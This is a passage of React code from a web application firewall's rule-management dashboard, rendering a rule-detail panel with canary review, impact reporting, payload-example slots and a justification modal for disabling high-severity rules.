                <div className="rule-meta-box">
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Dynamic Logs Blocks</div>
                  <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--danger-color)' }}>{selectedRule.hit_count} triggers</div>
                </div>
              </div>

              {/* canary review */}
              <div style={{ background: 'var(--surface-subtle)', border: '1px solid var(--border-subtle)', borderRadius: '8px', padding: '14px 16px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)', display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <FlaskConical size={14} color="var(--sev-low)" />
                    Canary Review
                  </div>
                  <button
                    onClick={() => handleToggleCanary(selectedRule, !selectedRule.is_canary)}
                    disabled={canaryToggling}
                    className="action-btn-inspect"
                    style={selectedRule.is_canary ? { background: 'var(--success-bg)', color: 'var(--success-color)', borderColor: 'var(--success-glow)' } : undefined}
                  >
                    {selectedRule.is_canary ? 'Flagged for Review' : 'Flag for Canary Review'}
                  </button>
                </div>
                <p style={{ fontSize: '11px', color: 'var(--text-secondary)', margin: 0, lineHeight: 1.5 }}>
                  Doesn't change enforcement — this rule keeps running exactly as before. Flags it for
                  review and lets you pull a historical-impact report: of its past matches, how many were
                  the <em>only</em> rule that fired on that request (disabling it would let those through)
                  vs. matched alongside another rule (still blocked either way).
                </p>
                {selectedRule.is_canary && canaryStatus && (
                  <div style={{ display: 'flex', gap: '8px', alignItems: 'center', flexWrap: 'wrap' }}>
                    <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                      Monitoring since {canaryStatus.started_at ? formatLocalTime(canaryStatus.started_at) : '—'}
                      {canaryStatus.elapsed_hours != null && (
                        ` (${Math.max(0, canaryStatus.window_hours - canaryStatus.elapsed_hours).toFixed(0)}h remaining)`
                      )}
                    </span>
                    {canaryStatus.needs_review && (
                      <span style={{ fontSize: '11px', background: 'var(--danger-bg)', color: 'var(--danger-color)', padding: '2px 8px', borderRadius: '4px', fontWeight: 600 }}>
                        Needs Review — window elapsed without a confident auto-decision
                      </span>
                    )}
                  </div>
                )}
                {selectedRule.is_canary && (
                  <div>
                    <button
                      onClick={() => handleLoadCanaryReport(selectedRule)}
                      disabled={canaryReportLoading}
                      className="action-btn-inspect"
                      style={{ fontSize: '11px' }}
                    >
                      {canaryReportLoading ? 'Loading...' : 'Load 7-Day Impact Report'}
                    </button>
                    {canaryReport && (
                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '10px', marginTop: '10px' }}>
                        <div className="rule-meta-box">
                          <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Total Matches</div>
                          <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--text-primary)' }}>{canaryReport.total_matches}</div>
                        </div>
                        <div className="rule-meta-box">
                          <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Sole Match (would open a hole)</div>
                          <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--danger-color)' }}>{canaryReport.sole_match_count}</div>
                        </div>
                        <div className="rule-meta-box">
                          <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Co-Matched (still safe)</div>
                          <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--success-color)' }}>{canaryReport.co_matched_count}</div>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* syntax block */}
              <div>
                <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <Code size={14} color="var(--sev-low)" />
                  CyberSentinel Engine Configuration Rule Syntax
                </div>
                {ruleDetailLoading ? (
                  <div style={{ background: 'var(--inset-bg)', padding: '24px', textAlign: 'center', borderRadius: '8px' }}>
                    <div className="spinner" style={{ margin: '0 auto' }}></div>
                  </div>
                ) : detailedRule ? (
                  <pre className="syntax-box">{detailedRule.syntax}</pre>
                ) : (
                  <pre className="syntax-box">{selectedRule.syntax}</pre>
                )}
              </div>

              {/* trigger examples */}
              <div>
                <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <Database size={14} color="var(--success-color)" />
                  Simulated Payload / Attack Trigger Examples
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {getPayloadSample(selectedRule.category).map((sample, idx) => (
                    <div key={idx} style={{ background: 'var(--surface-subtle)', padding: '10px 14px', borderRadius: '6px', border: '1px solid var(--border-subtle)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <code style={{ fontSize: '12px', color: 'var(--danger-color)', fontFamily: 'monospace' }}>{sample}</code>
                      <button
                        onClick={() => {
                          navigator.clipboard.writeText(sample);
                          showToast("Copied trigger payload to clipboard!");
                        }}
                        className="action-btn-inspect"
                        style={{ padding: '3px 8px', fontSize: '10px' }}
                      >
                        Copy
                      </button>
                    </div>
                  ))}
                </div>
              </div>

              {/* file path */}
              <div style={{ fontSize: '11px', color: 'var(--text-secondary)', borderTop: '1px solid var(--border-color)', paddingTop: '12px', fontFamily: 'monospace', wordBreak: 'break-all' }}>
                <strong>VENDOR SOURCE:</strong> {selectedRule.file_path}
              </div>
            </div>
          </div>
        </div>,
        document.body
      )}

      {/* --- Warn Override Confirmation Overlay for Disabling High/Critical Rules --- */}
      {createPortal(
        <AnimatePresence>
          {ruleToDisable && (
            <div className="modal-overlay" style={{ zIndex: 1100 }}>
              <motion.div
                className="modal-content pulse-warning"
                style={{ maxWidth: '520px', border: '1px solid var(--danger-border)' }}
                initial={{ scale: 0.95, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.95, opacity: 0 }}
              >
                <div className="modal-header" style={{ background: 'var(--danger-bg)', borderBottom: '1px solid var(--danger-border)' }}>
                  <div className="modal-title" style={{ color: 'var(--danger-color)' }}>
                    <AlertIcon size={20} color="var(--danger-color)" />
                    <span>Security Protection Override Warning</span>
                  </div>
                  <button className="modal-close-btn" onClick={() => setRuleToDisable(null)} aria-label="Close">
                    <X size={18} />
                  </button>
                </div>

                <div style={{ padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div className="warning-banner" style={{ margin: 0 }}>
                    <AlertTriangleIcon size={24} style={{ flexShrink: 0, marginTop: '2px' }} />
                    <div>
                      <h4 style={{ margin: '0 0 4px', fontWeight: 600 }}>Tuning Protection Override Alert</h4>
                      <p style={{ fontSize: '12px', margin: 0, lineHeight: '1.4' }}>
                        Disabling the rule <strong>{ruleToDisable.id} ({ruleToDisable.severity})</strong> degrades overall WAF security posture. This may leave application entry points vulnerable to SQL Injection, XSS, or RCE exploits.
                      </p>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-primary)', display: 'block', marginBottom: '8px' }}>
                      Tuning Override Justification <span style={{ color: 'var(--danger-color)' }}>*</span>
                    </label>
                    <textarea
                      placeholder="Provide detailed white-listing reason (e.g. White-listing corporate webhook false positive on parameter x)"
                      value={disableReason}
                      onChange={(e) => {
                        setDisableReason(e.target.value);
                        if (e.target.value.trim().length >= 3) setDisableError('');
                      }}
                      style={{
                        width: '100%',
                        height: '80px',
                        background: 'var(--inset-bg)',
                        border: '1px solid var(--border-color)',
                        borderRadius: '8px',
                        padding: '10px 12px',
                        color: 'var(--text-primary)',
                        fontSize: '13px',
                        outline: 'none',
                        resize: 'none'
                      }}
                    />
                    {disableError && (
                      <span style={{ fontSize: '11px', color: 'var(--danger-color)', display: 'block', marginTop: '4px' }}>
                        {disableError}
                      </span>
                    )}
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
                    <button
                      onClick={() => setRuleToDisable(null)}
                      className="action-btn-inspect"
                      style={{ background: 'transparent', color: 'var(--text-secondary)', borderColor: 'var(--border-strong)' }}
                    >
                      Cancel
                    </button>
                    <button
                      onClick={handleConfirmDisable}
                      className="action-btn-inspect"
                      style={{ background: 'var(--danger-color)', color: '#fff', borderColor: 'transparent', padding: '6px 16px' }}
                    >
                      Confirm Override
                    </button>
                  </div>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>,
        document.body
      )}

    </div>
  );
}

